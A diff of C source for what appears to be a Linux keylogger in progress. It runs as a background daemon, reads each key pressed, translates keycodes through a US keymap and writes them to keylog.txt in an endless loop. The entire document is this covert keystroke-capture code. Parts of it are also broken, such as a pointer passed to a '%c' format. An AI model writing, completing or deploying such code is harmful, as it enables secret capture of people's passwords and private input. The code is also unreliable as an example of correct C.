@@ -14,7 +14,9 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <syslog.h>
+
 #include <keymap.c>
+
 
 static void skeleton_daemon()
 {
@@ -101,21 +103,22 @@ int keycode_of_key_being_pressed() {
   return keycode;
 }
 
-char translated_key(int key) {
-  
-}
-
 int main()
 {
     skeleton_daemon();
     FILE * keylog; 
-
+    int auxkey, key;
+    key = auxkey = -999; 
     while (1) {
         keylog = fopen("keylog.txt","wt");
         while (1)    { //will only stop when the daemon dies
-            int key = keycode_of_key_being_pressed(); // key acá tendría KEY_31 
-            char translatedKey = 
-            fprintf(keylog,"%c",translated_key);
+            while(auxkey == key) {
+              key = keycode_of_key_being_pressed(); // key would be an int like 31 for example, that is an 's'
+            }
+            auxkey = key;
+            const char *us_translated_key = us_keymap[auxkey][0];
+            if (key>0) 
+              fprintf(keylog,"%c", &us_translated_key);
             fflush(keylog);
         }
     }
